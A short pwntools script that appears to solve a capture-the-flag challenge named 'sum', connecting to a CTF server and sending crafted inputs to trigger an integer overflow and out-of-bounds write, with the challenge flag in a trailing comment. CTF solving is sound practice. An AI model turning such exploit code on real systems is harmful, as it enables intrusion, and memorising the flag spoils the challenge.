from pwn import *
import sys

if  len(sys.argv) < 2:
	r = process('./sum')
else:
	host, port = 'chal.efiens.com', 2224
	r = remote(host, port)
# raw_input('debug')
print 'start'
r.recvuntil('> ')
r.sendline('9360')
i = 0
try:
	while i < 9360:
		r.recvuntil(': ')
		r.sendline('1')
		i += 1
except:
	print i
r.interactive()

#EFIENSCTF{int_overflow_leads_to_out_of_bound_write}